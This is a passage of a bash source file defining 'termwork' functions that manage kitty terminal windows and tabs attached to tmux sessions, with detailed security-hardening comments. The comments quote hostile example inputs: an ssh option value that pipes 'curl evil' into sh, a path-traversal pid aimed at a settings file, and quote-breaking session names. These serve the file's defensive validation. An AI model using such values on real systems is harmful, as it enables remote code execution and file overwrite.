#!/usr/bin/env bash
######################################################################
# .what = termwork — terminal window management via kitty IPC
# .why  = open visible terminals for humans, composable with ductwork
#
# usage:
#   term.open --via kitty                     # open kitty with shell
#   term.open --via kitty --cwd /path         # open in directory
#   term.open --via kitty --on work           # attach to local duct
#   term.open --via kitty --on user@host:work # attach to remote duct (cloud)
#   term.open --via kitty --pid 12345         # focus terminal
#   term.stop --via kitty --on work           # stop terminal by duct name
#   term.stop --via kitty --on user@host:work # stop terminal by remote duct
#   term.stop --via kitty --pid 12345         # stop terminal by pid
#   term.read --via kitty --on work           # read terminal by duct name
#   term.read --via kitty --on user@host:work # read terminal by remote duct
#   term.read --via kitty --pid 12345         # read terminal by pid
#   term.send --via kitty --on work --what "cmd"           # send by duct name
#   term.send --via kitty --on user@host:work --what "cmd" # send to remote duct
#   term.send --via kitty --pid 12345 --what "cmd"         # send by pid
#   term.list --via kitty                     # list open terminals
#
# roles (the ergonomic interface — one duct per role at <terminal>/<role>):
#   term.open --via kitty --on worktree --for mechanic  # open worktree, base tab 'mechanic' (worktree/mechanic)
#   term.open --via kitty --on worktree --for foreman   # add tab 'foreman' (worktree/foreman)
#   term.read --via kitty --on worktree --for foreman   # read the foreman tab
#   term.send --via kitty --on worktree --for foreman --what cmd
#   term.stop --via kitty --on worktree --for foreman   # close only the foreman tab
#   term.stop --via kitty --on worktree                 # close worktree + all its role tabs
#
#   - --for <role> = --tab <role> --duct <terminal>/<role> (clean title, role-scoped duct)
#   - the FIRST --for on a fresh terminal is its base tab; a later --for adds a tab
#   - the terminal identity stays <terminal> (--on), so --on finds it for every role
#   - --for is local-only in v1
#
# tabs (the low-level primitives that --for is built on):
#   term.open --via kitty --on dev --tab aux            # add tab 'aux' (attaches session 'aux')
#   term.open --via kitty --on dev --tab aux --duct srv # add tab 'aux' that attaches session 'srv'
#   term.read --via kitty --on dev --tab aux            # read tab 'aux'
#   term.send --via kitty --on dev --tab aux --what cmd # send to tab 'aux'
#   term.stop --via kitty --on dev --tab aux            # close only tab 'aux'
#   term.stop --via kitty --on dev                      # close terminal + all its tabs
#
#   - a tab slug is unique within its terminal; address is (--on <terminal>, --tab <slug>)
#   - --tab <slug> = the tab's title AND addressable id; commands key off this id
#   - the FIRST --tab for a not-yet-open terminal labels its base tab
#   - a later --tab adds a tab; --duct <session> overrides the session it attaches
#     (defaults to <slug>), so the clean label never leaks the real session name
#   - absent --tab/--for = base tab named 'main' (or TERMWORK_BASE_TAB); prior callers unchanged
#   - --pid addresses a terminal, never a tab
#
# remote ducts:
#   - use ductwork to create remote session: duct.open --on duct://grove-1/main/mechanic
#   - use termwork to attach local window:   term.open --via kitty --on user@host:work
#
#   .note ductwork's `--on` takes a duct URI (`duct://<host>/<tree>/<role>`), which is a
#         DIFFERENT vocabulary than termwork's `--on`, which names a terminal. the two
#         are not interchangeable; do not copy one into the other
#   - kitty runs locally, ssh tunnels to remote tmux session
#   - ctrl+x d detaches locally, remote session continues
#
# namespaces:
#   duct.* = session management (tmux, local or cloud)
#   term.* = window management (kitty, always local)
#
# requires: kitty (sudo apt install kitty)
######################################################################

__term_ensure_dir() {
  TERMWORK_DIR="${TERMWORK_DIR:-$HOME/.termwork}"
  mkdir -p "$TERMWORK_DIR"
}

######################################################################
# .what = pass one registry value through the control-byte sink
#
# .why  = `__term_register` declares `cwd`, `duct`, and `host` ATTACKER-SHAPED,
#         and `term.list` writes all three to a TERMINAL. a linux directory name
#         may hold any byte but `/` and NUL, so it may hold ESC — and an ESC
#         that reaches a terminal is a command, not text. `@tsv` frames a field
#         and escapes only tab/newline/return; it leaves ESC alone.
#
#         a pulled tree is the reachable path: a grove is ASSUME COMPROMISED, so
#         a directory it authored can carry the bytes, and a `term.open` in that
#         directory records them.
#
# ⚠️ .the SINK IS `__duct_strip_escapes`, and it is not redeclared here
#       `~/.bash_aliases.ductwork.sh` is sourced BEFORE this file, at
#       `bash_aliases.sh:2`. a second copy of the strip would be one fact with
#       two holders, free to drift the day either is tuned
#       (`gotcha.a-check-that-cries-wolf-gets-silenced`, m.9). this is the same
#       dependency `_git_commit_line` already takes, and the same shape.
#
# ⚠️ .an absent sink fails CLOSED
#       where ductwork was not sourced, the pipeline writes `command not found`
#       and yields an empty string. a value that was non-empty and came back
#       empty is therefore reported as `(unreadable)` — never as the raw bytes
#       (`rule.forbid.failhide`). an ALREADY-empty value stays empty, because an
#       absent `duct` is legal and marks a plain shell.
######################################################################
__term_sink() {
  local raw="$1" out
  out="$(printf '%s' "$raw" | __duct_strip_escapes 2>/dev/null)"
  if [[ -n "$raw" && -z "$out" ]]; then
    printf '%s' '(unreadable)'
    return 0
  fi
  printf '%s' "$out"
}

# .what = the SOLE builder of a termwork registry path, from a terminal pid
# .why  = a pid arrives from argv (`--pid "$2"`, never checked) and from a
#         registry record's own `.pid` field, and it is then JOINED into a
#         laptop path — `$TERMWORK_DIR/$pid.json` and `$TERMWORK_DIR/.lock.$pid`.
#         the lock path is consumed as `9>"$lockpath"`, i.e. a WRITE
#         DESTINATION. so a `--pid ../../.claude/settings` (or a `.pid` a
#         corrupt record names) picks the file that gets written.
#
#         the grammar is not a guess: a pid IS decimal digits. so this states
#         the ALLOWED shape rather than a deny-list of bad bytes
#         (`rule.require.solve-at-cause`) — a deny-list must anticipate every
#         way to spell a traversal; an allow-list of `[0-9]` admits no path.
#
#         ⚠️ ONE builder, not ten. the grammar is one fact; ten inline joins
#         would be ten holders free to drift, and the one that drifts is the
#         one nobody re-reads (m.9, `gotcha.a-check-that-cries-wolf-gets-silenced`).
#         `2.7.aliases`' configure.verify counts the joins in this file and
#         demands the count be 1 — this function's own.
#
# usage:  file="$(__term_as_registry_file record "$pid")" || return $?
#         lock="$(__term_as_registry_file lock "$pid")"   || return $?
__term_as_registry_file() {
  local kind="$1" pid="$2"
  if [[ -z "$pid" ]]; then
    echo "✋ termwork: an empty pid addresses no terminal" >&2
    return 2
  fi
  if [[ "$pid" == *[!0-9]* ]]; then
    echo "✋ termwork: '$pid' is not a pid — a pid is decimal digits, [0-9]" >&2
    echo "   └─ a registry path is derived from it, so it must be one" >&2
    return 2
  fi
  __term_ensure_dir
  case "$kind" in
    record) printf '%s\n' "$TERMWORK_DIR/$pid.json" ;;
    lock) printf '%s\n' "$TERMWORK_DIR/.lock.$pid" ;;
    *)
      echo "💥 termwork: unknown registry kind '$kind'" >&2
      return 1
      ;;
  esac
}

# .what = print usage for one term.* verb (to stdout; exit 0)
# .why  = every verb honors --help/-h with real docs, not an "unknown arg" error
__term_usage() {
  local verb="$1"
  case "$verb" in
    term.open)
      cat <<'EOF'
term.open — open or focus a kitty terminal, or add a role tab

  --via kitty            (required) terminal backend
  --on <terminal>        attach to a duct/terminal by slug (local or user@host:sess)
  --for <role>            role tab at <terminal>/<role> (= --tab <role> --duct <terminal>/<role>)
  --cwd <path>           open in a directory
  --pid <pid>            focus an extant terminal by pid
  --tab <slug>           label the base tab (first open) or add/focus a tab
  --duct <session>       tmux session an added --tab attaches (default: the --tab slug)
  --shell <path>         shell to launch (default: $SHELL)
  --help, -h             show this help

  --for <role> is the ergonomic interface: a role's duct lives at <terminal>/<role>.
  the FIRST --for on a fresh terminal is its base tab; a later --for adds a tab. the
  terminal identity stays <terminal> (--on), so --on finds it for every role. --for
  is local-only and must not be combined with --tab/--duct.

  low-level: --tab <slug> is the tab's title AND addressable id; --duct <session>
  overrides the session it attaches (default: the slug), so the clean label never
  leaks the session name. the FIRST --tab on a not-yet-open terminal becomes its base
  tab (which attaches its --duct, default the slug); a later --tab adds a tab.

  absent --tab/--for = the terminal's base tab (named 'main' by default; override
  with the TERMWORK_BASE_TAB env var). the base tab's label is independent of the
  window title (which the shell keeps as repo:branch). --tab/--for require --on.
EOF
      ;;
    term.stop)
      cat <<'EOF'
term.stop — close a terminal (and all its tabs), or one tab

  --via kitty            (required) terminal backend
  --on <terminal>        the terminal by slug
  --pid <pid>            the terminal by pid
  --for <role>           close only the role's tab (= --tab <role>)
  --tab <slug>           close only that tab (last tab → terminal closes)
  --help, -h             show this help

  no --tab/--for = close the terminal + all its tabs. --tab/--for require --on.
EOF
      ;;
    term.read)
      cat <<'EOF'
term.read — print a terminal's (or tab's) text to stdout

  --via kitty            (required) terminal backend
  --on <terminal>        the terminal by slug
  --pid <pid>            the terminal by pid
  --for <role>           read only the role's tab (= --tab <role>)
  --tab <slug>           read only that tab
  --help, -h             show this help

  --tab/--for require --on.
EOF
      ;;
    term.send)
      cat <<'EOF'
term.send — send text (+Enter) to a terminal or tab

  --via kitty            (required) terminal backend
  --on <terminal>        the terminal by slug
  --pid <pid>            the terminal by pid
  --what <text>          (required) the text to send
  --for <role>           send only to the role's tab (= --tab <role>)
  --tab <slug>           send only to that tab
  --help, -h             show this help

  --tab/--for require --on.
EOF
      ;;
    term.list)
      cat <<'EOF'
term.list — list open terminals, with their tabs nested

  --via kitty            (required) terminal backend
  --help, -h             show this help
EOF
      ;;
  esac
}

# parse duct slug into host and session
# e.g., "user@host:work" -> TERM_HOST="user@host", TERM_SESSION="work"
# e.g., "work" -> TERM_HOST="", TERM_SESSION="work"
__term_parse_duct_slug() {
  local slug="$1"
  if [[ "$slug" == *:* ]]; then
    TERM_HOST="${slug%:*}"
    TERM_SESSION="${slug#*:}"
  else
    TERM_HOST=""
    TERM_SESSION="$slug"
  fi
}

__term_is_remote() {
  [[ -n "$TERM_HOST" ]]
}

# .what = compose the `tmux attach-session` command line for one session name,
#         with the name CARRIED as base64 rather than interpolated as text
# .why  = every caller of this hands the result to a shell — a local
#         `"$shell" -l -i -c "<cmd>"`, or an `ssh -t <host> "<cmd>"` whose far
#         side joins its argv into one string for a login shell. so the session
#         name is CODE at that point, and it was written as `'$session'` —
#         a single `'` in the name closes the quote and the rest is a command.
#
#         the name is not the human's alone: `duct.list` reports session names
#         a GROVE chose, `term.open --on <slug>` takes one, and the registry's
#         own `.duct`/`.host` fields are written from them. so a remote party
#         picks bytes that become code on the laptop — the ingress shape.
#
#         base64's alphabet is `[A-Za-z0-9+/=]`. it holds no quote, no `$`, no
#         `;`, no backtick — so the value cannot close the quotes around it,
#         whatever it is. the far side decodes it back to the exact bytes, so
#         a session name with any legal character still attaches.
#         this is the same boundary `__duct_ssh_tmux` makes in `ductwork.sh`.
__term_as_attach_command() {
  local session="$1" b64
  b64="$(printf '%s' "$session" | base64 | tr -d '\n')"
  printf '%s\n' "tmux attach-session -t \"\$(printf %s '$b64' | base64 -d)\""
}

# .what = guard that a value is a `[user@]hostname` before it reaches `ssh`
# .why  = `ssh` reads its first positional as a HOST only if it does not begin
#         with `-`. a value that does is parsed as an OPTION, and ssh has one
#         that runs a command: `-oProxyCommand=<anything>`. so a host of
#         `-oProxyCommand=curl evil|sh` is code on this laptop, and it reaches
#         `ssh` from a registry record's `.host` and from a `--on user@host:s`
#         slug — both of which a grove's own session listing can shape.
#
#         `--` is not the fix to reach for: its handling has varied, and a
#         guard that rests on one ssh build is a guard nobody can re-verify.
#         a hostname's grammar is known, so this states the ALLOWED shape
#         (`rule.require.solve-at-cause`): `[A-Za-z0-9._-]`, with at most one
#         `@` to split an optional user. no `-` may lead either half.
__term_as_ssh_host() {
  local host="$1" user=""
  # 🛑 `name` gets its OWN statement, NEVER a slot on the `local` line above
  #   - bash expands every word of a simple command BEFORE it runs the builtin,
  #     so `local host="$1" name="$host"` reads `$host` from the ENCLOSING scope
  #   - no caller sets a `host` there, so `name` was always EMPTY, and this guard
  #     refused every bare hostname with "'' is not a hostname"
  #   - ⚠️ the `user@host` form escaped it, because that branch re-assigns `name`
  #     in a later statement — so one live path masked one dead one, and the
  #     verdict contradicted the evidence it printed beside it
  #   - 📜 measured 2026-09-03: `term.open --on 'grove-x:main/mechanic'` could
  #     not open a remote duct window at all
  local name="$host"
  if [[ -z "$host" ]]; then
    echo "✋ termwork: an empty host names no box" >&2
    return 2
  fi
  if [[ "$host" == *@* ]]; then
    user="${host%%@*}"
    name="${host#*@}"
    if [[ "$name" == *@* ]]; then
      echo "✋ termwork: '$host' is not a host — a host holds at most one '@'" >&2
      return 2
    fi
    if [[ -z "$user" || "$user" == -* || "$user" == *[!A-Za-z0-9._-]* ]]; then
      echo "✋ termwork: '$host' is not a host — '$user' is not a user name" >&2
      return 2
    fi
  fi
  if [[ -z "$name" || "$name" == -* || "$name" == *[!A-Za-z0-9._-]* ]]; then
    echo "✋ termwork: '$host' is not a host — '$name' is not a hostname" >&2
    echo "   └─ ssh reads a leading '-' as an option, so a host must not start with one" >&2
    return 2
  fi
  printf '%s\n' "$host"
}

# .what = write a terminal's registry record
# .why  = ⚠️ this record is composed with `jq -n --arg`, never a heredoc.
#         `cwd`, `duct`, and `host` are ATTACKER-SHAPED: `cwd` is a directory
#         name (a linux dir may hold any byte but `/` and NUL, so a `"` is
#         legal), and `duct`/`host` arrive from argv. a heredoc interpolates
#         them raw, so one `"` forges a key — and since `socket` is written
#         BEFORE `cwd`, jq's last-duplicate-wins means a forged `"socket"`
#         inside `--cwd` OVERRIDES the real socket path. every later verb
#         reads `.socket` back and hands it to `kitten @ --to`, so the forged
#         value picks the control endpoint.
#
#         `jq --arg` escapes each value as JSON data. a `"` in a cwd then
#         lands as `\"` inside one string, and can close no key.
__term_register() {
  local pid="$1"
  local socket="$2"
  local cwd="$3"
  local duct="$4"
  local host="$5"
  local f
  f="$(__term_as_registry_file record "$pid")" || return $?
  local tmp
  tmp=$(mktemp)
  if ! jq -n \
    --argjson pid "$pid" \
    --arg socket "$socket" \
    --arg cwd "$cwd" \
    --arg duct "$duct" \
    --arg host "$host" \
    --argjson startedAt "$(date +%s)000" \
    '{pid: $pid, socket: $socket, cwd: $cwd, duct: $duct, host: $host, tabs: [], startedAt: $startedAt}' \
    > "$tmp"; then
    rm -f "$tmp"
    echo "💥 __term_register: failed to compose registry for pid $pid" >&2
    return 1
  fi
  if ! mv "$tmp" "$f"; then
    rm -f "$tmp"
    echo "💥 __term_register: failed to commit registry for pid $pid" >&2
    return 1
  fi
}

# .what = findsert a tab entry (slug + kittyId) into a terminal's record
# .why  = tabs are tracked per-terminal so stop-all / list / match can find
#         them; findsert keeps re-open idempotent (no duplicate slug). the
#         kittyId is the robust window handle captured at launch (null if the
#         launch printed no numeric id — the match then falls back to title)
# .lock = precondition: caller must hold the terminal lock (see __term_lock_path);
#         this op is a read-modify-write on the tabs array
__term_register_tab() {
  local pid="$1"
  local slug="$2"
  local kittyid="$3"
  local f
  f="$(__term_as_registry_file record "$pid")" || return $?
  # the caller holds the lock and has verified the terminal is alive, so an
  # absent record here is an invalid state — fail loud, never drop the tab
  if [[ ! -f "$f" ]]; then
    echo "💥 __term_register_tab: no registry for pid $pid (terminal record vanished?)" >&2
    return 1
  fi
  local tmp
  tmp=$(mktemp)
  # replace any extant tab with the same slug (findsert), then append fresh
  # fail loud on a jq error (a corrupt record) rather than swallow it
  if ! jq --arg slug "$slug" --argjson kittyid "${kittyid:-null}" \
    '.tabs = ((.tabs // []) | map(select(.slug != $slug))) + [{"slug": $slug, "kittyId": $kittyid}]' \
    "$f" > "$tmp"; then
    rm -f "$tmp"
    echo "💥 __term_register_tab: failed to update registry for pid $pid (corrupt $f?)" >&2
    return 1
  fi
  # fail loud if the atomic swap fails (disk full, permission) rather than leak
  # the temp file and let the caller believe the tab was recorded
  if ! mv "$tmp" "$f"; then
    rm -f "$tmp"
    echo "💥 __term_register_tab: failed to commit registry for pid $pid" >&2
    return 1
  fi
}

# .what = print all registered tab slugs for a terminal (one per line)
# .why  = stop-all closes each tab window; term.list nests them
__term_list_tab_slugs() {
  local pid="$1"
  local f
  f="$(__term_as_registry_file record "$pid")" || return $?
  # an absent record is an invalid state for a live terminal — fail loud
  if [[ ! -f "$f" ]]; then
    echo "💥 __term_list_tab_slugs: no registry for pid $pid (terminal record vanished?)" >&2
    return 1
  fi
  if ! jq -r '(.tabs // [])[].slug' "$f"; then
    echo "💥 __term_list_tab_slugs: failed to read registry for pid $pid (corrupt $f?)" >&2
    return 1
  fi
}

# .what = report tab-slug state: exit 0 = registered, 1 = absent, 2 = unreadable
# .why  = read/send/stop guard against a typo slug → fail clear, not silent no-op.
#         the three-state exit lets callers tell "no such tab" (caller fixes)
#         apart from "corrupt/vanished record" (malfunction) — see __term_require_tab
__term_has_tab() {
  local pid="$1"
  local slug="$2"
  local f
  f="$(__term_as_registry_file record "$pid")" || return 2
  # an absent record for a live terminal is a malfunction, not "tab absent" —
  # surface it as exit 2 (unreadable) so it is never read as a plain miss
  if [[ ! -f "$f" ]]; then
    echo "💥 __term_has_tab: no registry for pid $pid (terminal record vanished?)" >&2
    return 2
  fi
  local found
  # fail loud (exit 2) on a jq error so a corrupt record is not read as "absent"
  if ! found=$(jq -r --arg slug "$slug" '(.tabs // []) | any(.slug == $slug)' "$f"); then
    echo "💥 __term_has_tab: failed to read registry for pid $pid (corrupt $f?)" >&2
    return 2
  fi
  [[ "$found" == "true" ]]
}

# .what = guard that a tab slug is registered; propagate a clean exit code
# .why  = read/send/stop share one guard so the "absent" (exit 2, caller fixes)
#         vs "unreadable record" (exit 1, malfunction) distinction is made once,
#         not re-derived — and mis-derived — at each call site (failhide hazard).
#         usage: __term_require_tab "$pid" "$slug" "$duct" "term.read" || return $?
__term_require_tab() {
  local pid="$1"
  local slug="$2"
  local duct="$3"
  local verb="$4"
  __term_has_tab "$pid" "$slug"
  local rc=$?
  # exit 2 = unreadable record; __term_has_tab already reported it → malfunction
  if [[ $rc -eq 2 ]]; then
    return 1
  fi
  # any other non-zero = the slug is genuinely absent; the caller must fix it
  if [[ $rc -ne 0 ]]; then
    echo "✋ $verb: no tab '$slug' in terminal '$duct'" >&2
    return 2
  fi
  return 0
}

# .what = print the stored kittyId for a tab slug (empty if the slug has none)
# .why  = per-tab ops prefer the robust window id (--match id:N) over the title
__term_get_tab_kittyid() {
  local pid="$1"
  local slug="$2"
  local f
  f="$(__term_as_registry_file record "$pid")" || return $?
  # an absent record for a live terminal is a malfunction — fail loud, never
  # let the caller silently fall back to a title match on a vanished record
  if [[ ! -f "$f" ]]; then
    echo "💥 __term_get_tab_kittyid: no registry for pid $pid (terminal record vanished?)" >&2
    return 1
  fi
  if ! jq -r --arg slug "$slug" \
    'first(.tabs[]? | select(.slug == $slug) | .kittyId) // empty' "$f"; then
    echo "💥 __term_get_tab_kittyid: failed to read registry for pid $pid (corrupt $f?)" >&2
    return 1
  fi
}

# .what = exit 0 if the value is a clean positive integer (a usable kitty id)
# .why  = names the "did launch yield a real window id?" check so callers read as
#         narrative, not an inline regex; reused by term.open + __term_tab_match
__term_is_kitty_id() {
  [[ "$1" =~ ^[0-9]+$ ]]
}

# .what = echo the kitten @ --match selector for a tab (prefer id, else title)
# .why  = the stored kittyId is the robust handle; title is the fallback when
#         the launch did not yield a numeric id
__term_tab_match() {
  local pid="$1"
  local slug="$2"
  local kid
  kid=$(__term_get_tab_kittyid "$pid" "$slug") || return 1
  local match="title:$slug"
  __term_is_kitty_id "$kid" && match="id:$kid"
  echo "$match"
}

# .what = drop one tab entry (by slug) from a terminal's record
# .why  = term.stop --tab removes just that tab; terminal + other tabs survive
# .lock = precondition: caller must hold the terminal lock (see __term_lock_path);
#         this op is a read-modify-write on the tabs array
__term_unregister_tab() {
  local pid="$1"
  local slug="$2"
  local f
  f="$(__term_as_registry_file record "$pid")" || return $?
  # the caller holds the lock and has verified the terminal is alive, so an
  # absent record here is an invalid state — fail loud, not a silent no-op
  if [[ ! -f "$f" ]]; then
    echo "💥 __term_unregister_tab: no registry for pid $pid (terminal record vanished?)" >&2
    return 1
  fi
  local tmp
  tmp=$(mktemp)
  if ! jq --arg slug "$slug" '.tabs = ((.tabs // []) | map(select(.slug != $slug)))' \
    "$f" > "$tmp"; then
    rm -f "$tmp"
    echo "💥 __term_unregister_tab: failed to update registry for pid $pid (corrupt $f?)" >&2
    return 1
  fi
  # fail loud if the atomic swap fails rather than leave a stale tab entry while
  # the caller believes the tab was dropped
  if ! mv "$tmp" "$f"; then
    rm -f "$tmp"
    echo "💥 __term_unregister_tab: failed to commit registry for pid $pid" >&2
    return 1
  fi
}

__term_unregister() {
  local pid="$1"
  local f
  f="$(__term_as_registry_file record "$pid")" || return $?
  rm -f "$f"
}

# .what = echo the per-terminal lock file path for a terminal pid
# .why  = the tabs array is mutated read-modify-write; every op that touches a
#         terminal's registry (open/read/send/stop --tab and whole-terminal stop)
#         locks on this path so concurrent writes cannot interleave or lose an
#         update (behavior hazard). keyed by pid — the terminal's stable identity —
#         so the --pid and --on paths share one lock. term.open takes it after its
#         (unlocked) duct lookup, then re-verifies the record inside the lock.
__term_lock_path() {
  local pid="$1"
  __term_as_registry_file lock "$pid" || return $?
}

__term_find_by_duct() {
  local slug="$1"
  __term_ensure_dir

  # parse the slug to match against stored duct+host
  __term_parse_duct_slug "$slug"
  local want_host="$TERM_HOST"
  local want_session="$TERM_SESSION"

  local f d h pid
  while IFS= read -r -d '' f; do
    [[ -f "$f" ]] || continue
    # surface a corrupt record on stderr and skip just that file, rather than
    # swallow the jq error — a single bad record must not abort the whole scan
    if ! d=$(jq -r '.duct // ""' "$f") || ! h=$(jq -r '.host // ""' "$f"); then
      echo "⚠️  __term_find_by_duct: skipped unreadable record $f (corrupt?)" >&2
      continue
    fi
    if [[ "$d" == "$want_session" && "$h" == "$want_host" ]]; then
      # surface a corrupt record rather than swallow the pid read (failhide)
      if ! pid=$(jq -r '.pid' "$f"); then
        echo "⚠️  __term_find_by_duct: skipped unreadable record $f (corrupt?)" >&2
        continue
      fi
      # check if process still alive
      if kill -0 "$pid" 2>/dev/null; then
        echo "$pid"
        return 0
      else
        # stale entry, clean up
        rm -f "$f"
      fi
    fi
  done < <(find "$TERMWORK_DIR" -maxdepth 1 -name '*.json' -print0 2>/dev/null)
  # return 0 even when not found — empty output is valid, not an error
  # (return 1 breaks scripts with set -euo pipefail)
  return 0
}

__term_get_socket() {
  local pid="$1"
  local f
  f="$(__term_as_registry_file record "$pid")" || return $?
  if [[ -f "$f" ]]; then
    jq -r '.socket' "$f" 2>/dev/null
  fi
}

# .what = print the stored remote host for a terminal ("" = local)
# .why  = term.open --tab guards remote terminals (tabs are local-only in v1)
__term_get_host() {
  local pid="$1"
  local f
  f="$(__term_as_registry_file record "$pid")" || return $?
  # an absent record for a live terminal is a malfunction — fail loud so the
  # remote-guard never reads a vanished record as an empty (local) host
  if [[ ! -f "$f" ]]; then
    echo "💥 __term_get_host: no registry for pid $pid (terminal record vanished?)" >&2
    return 1
  fi
  if ! jq -r '.host // ""' "$f"; then
    echo "💥 __term_get_host: failed to read registry for pid $pid (corrupt $f?)" >&2
    return 1
  fi
}

# ── kitty ipc communicators ──────────────────────────────────────────────────
# each wraps one raw `kitten @` call so the verb orchestrators read as narrative
# and the i/o boundary (auth-free unix socket) lives in one named place. exit
# code propagates from kitten; callers decide how to react.
#
# note: --to is a GLOBAL `kitten @` option (before the subcommand); --match is a
# SUBCOMMAND option (after it). kitty rejects --match placed before the subcommand
# with "Unknown option: --match", so every matched op puts --match after the verb.

# .what = focus a tab window by its match selector (exit 0 = focused)
__term_focus_tab() {
  local socket="$1"
  local match="$2"
  kitten @ --to "$socket" focus-window --match "$match" >/dev/null
}

# .what = focus a terminal's base window (exit 0 = focused)
__term_focus_base() {
  local socket="$1"
  kitten @ --to "$socket" focus-window >/dev/null
}

# .what = probe whether a matched window still exists (exit 0 = present)
# .why  = tells a transient focus failure (window present) from a stale entry
__term_probe_tab() {
  local socket="$1"
  local match="$2"
  kitten @ --to "$socket" ls --match "$match" >/dev/null 2>&1
}

# .what = launch a new tab titled by $title, attached to tmux session $session,
#         and print the new kitty window id
# .why  = title and session are decoupled: the tab bar shows a clean human label
#         ($title) while the tab attaches a possibly-uglier globally-unique session
#         ($session). callers that pass one slug for both get today's behavior.
__term_launch_tab() {
  local socket="$1"
  local title="$2"
  local cwd="$3"
  local shell="$4"
  local session="$5"
  # ⚠️ the session name is CARRIED, never interpolated — see __term_as_attach_command
  local attach
  attach="$(__term_as_attach_command "$session")" || return $?
  kitten @ --to "$socket" launch \
    --type=tab \
    --tab-title "$title" \
    --cwd "$cwd" \
    -- "$shell" -l -i -c "$attach"
}

# .what = set an explicit title on the active tab (exit 0 = set)
# .why  = an explicit tab title overrides tab_title_template "{title}", so the tab
#         label is decoupled from the shell's OSC-2 window title (repo:branch stays
#         in the titlebar; the tab bar shows this label instead)
__term_set_tab_title() {
  local socket="$1"
  local title="$2"
  kitten @ --to "$socket" set-tab-title "$title"
}

# .what = print the id of a terminal's base (first) window, empty on failure
# .why  = the base terminal is spawned with the `kitty` binary (not `launch`), so
#         no id is printed; query it here to store as the base tab's robust handle
__term_get_base_window_id() {
  local socket="$1"
  kitten @ --to "$socket" ls 2>/dev/null | jq -r 'first(.[].tabs[].windows[].id) // empty' 2>/dev/null
}

# .what = poll a socket until it answers `ls`, up to ~2s (exit 0 = ready)
# .why  = a fresh kitty creates its listen socket asynchronously; the base-tab
#         title/id calls must not fire against a not-yet-ready (or already dead)
#         socket, which would leak a raw "connect: no such file" error
__term_await_socket() {
  local socket="$1"
  local tries=20
  while (( tries-- > 0 )); do
    kitten @ --to "$socket" ls >/dev/null 2>&1 && return 0
    sleep 0.1
  done
  return 1
}

# .what = report whether a local tmux session exists (exit 0 = present)
# .why  = a duct terminal runs `tmux attach-session -t <s>`; if the session is
#         absent the shell exits and the kitty dies instantly — guard first and
#         fail clear instead of a window that vanishes
__term_has_tmux_session() {
  local session="$1"
  tmux has-session -t "$session" 2>/dev/null
}

# .what = close one window by its match selector (exit 0 = closed)
__term_close_window_matched() {
  local socket="$1"
  local match="$2"
  kitten @ --to "$socket" close-window --match "$match"
}

# .what = close a terminal's base window (exit 0 = closed)
__term_close_window_base() {
  local socket="$1"
  kitten @ --to "$socket" close-window
}

# .what = print a matched window's text to stdout (exit 0 = read)
__term_get_text() {
  local socket="$1"
  local match="$2"
  kitten @ --to "$socket" get-text --match "$match"
}

# .what = print a terminal's (base window) text to stdout (exit 0 = read)
__term_get_text_base() {
  local socket="$1"
  kitten @ --to "$socket" get-text
}

# .what = send text + Enter to a matched window (exit 0 = sent)
__term_send_text() {
  local socket="$1"
  local match="$2"
  local what="$3"
  printf '%s\r' "$what" | kitten @ --to "$socket" send-text --match "$match" --stdin
}

# .what = send text + Enter to a terminal's base window (exit 0 = sent)
__term_send_text_base() {
  local socket="$1"
  local what="$2"
  printf '%s\r' "$what" | kitten @ --to "$socket" send-text --stdin
}

term.open() {
  local via=""
  local cwd=""
  local duct=""
  local pid=""
  local tab=""
  local tab_duct=""
  local role=""
  local base_label=""
  local shell="${SHELL:-/bin/bash}"

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --via) via="$2"; shift 2 ;;
      --cwd) cwd="$2"; shift 2 ;;
      --on) duct="$2"; shift 2 ;;
      --pid) pid="$2"; shift 2 ;;
      --tab) tab="$2"; shift 2 ;;
      --duct) tab_duct="$2"; shift 2 ;;
      --for) role="$2"; shift 2 ;;
      --shell) shell="$2"; shift 2 ;;
      --help|-h) __term_usage term.open; return 0 ;;
      *) echo "✋ term.open: unknown arg '$1'" >&2; return 2 ;;
    esac
  done

  if [[ -z "$via" ]]; then
    echo "✋ term.open: --via required (e.g., --via kitty)" >&2
    return 2
  fi

  if [[ "$via" != "kitty" ]]; then
    echo "✋ term.open: unknown terminal '$via' (supported: kitty)" >&2
    return 2
  fi

  # --for <role> is role-scoped sugar: it expands to --tab <role> --duct <slug>/<role>,
  # so a role's duct is found at <terminal>/<role>. a fresh terminal's first --for
  # becomes its base tab (which attaches slug/role); a later --for adds a tab. the tab
  # bar shows the clean <role>, never the longer slug/role session name.
  if [[ -n "$role" ]]; then
    if [[ -z "$duct" ]]; then
      echo "✋ term.open: --for requires --on <terminal>" >&2
      return 2
    fi
    if [[ -n "$tab" || -n "$tab_duct" ]]; then
      echo "✋ term.open: --for is shorthand for --tab/--duct; do not combine them" >&2
      return 2
    fi
    # role ducts live at slug/role — a local convention; remote role terminals are
    # not supported in v1 (tabs are local-only), so fail clear on a remote slug
    if [[ "$duct" == *:* ]]; then
      echo "✋ term.open: --for role terminals are local-only in v1 (no remote '$duct')" >&2
      return 2
    fi
    tab="$role"
    tab_duct="$duct/$role"
  fi

  # --tab addresses a tab within a terminal's namespace; --pid names a terminal
  if [[ -n "$tab" && -n "$pid" ]]; then
    echo "✋ term.open: --pid addresses a terminal; use --on <terminal> --tab <slug> for a tab" >&2
    return 2
  fi

  # --duct sets the session an added --tab attaches; it is meaningless without --tab
  if [[ -n "$tab_duct" && -z "$tab" ]]; then
    echo "✋ term.open: --duct sets the session for --tab; it requires --tab <slug>" >&2
    return 2
  fi

  # --tab <slug>: label the base tab (first open) or add/focus a tab in --on terminal
  if [[ -n "$tab" ]]; then
    if [[ -z "$duct" ]]; then
      echo "✋ term.open: --tab requires --on <terminal>" >&2
      return 2
    fi
    cwd="${cwd:-$(pwd)}"

    # find the host terminal by duct (unlocked). the record is re-verified inside
    # the lock below, so a concurrent stop between here and the lock is caught.
    local host_pid
    host_pid=$(__term_find_by_duct "$duct")

    # terminal not open yet → this first --tab/--for becomes its base tab. carry the
    # label in base_label and fall through to the base-open flow below, where the base
    # attaches the tab's duct (tab_duct, default: the slug).
    if [[ -z "$host_pid" ]]; then
      base_label="$tab"
    fi

    # terminal already open → add (or focus) a tab under the per-terminal lock.
    # serialize check→launch→register under the lock (keyed by pid, shared with
    # every other op on this terminal). the brace group holds fd 9 for its
    # duration; return tears it down (unlocks). single-digit fd keeps the redirect
    # parseable when this file is sourced into zsh as well as bash.
    if [[ -n "$host_pid" ]]; then
    local lockpath
    lockpath=$(__term_lock_path "$host_pid")
    {
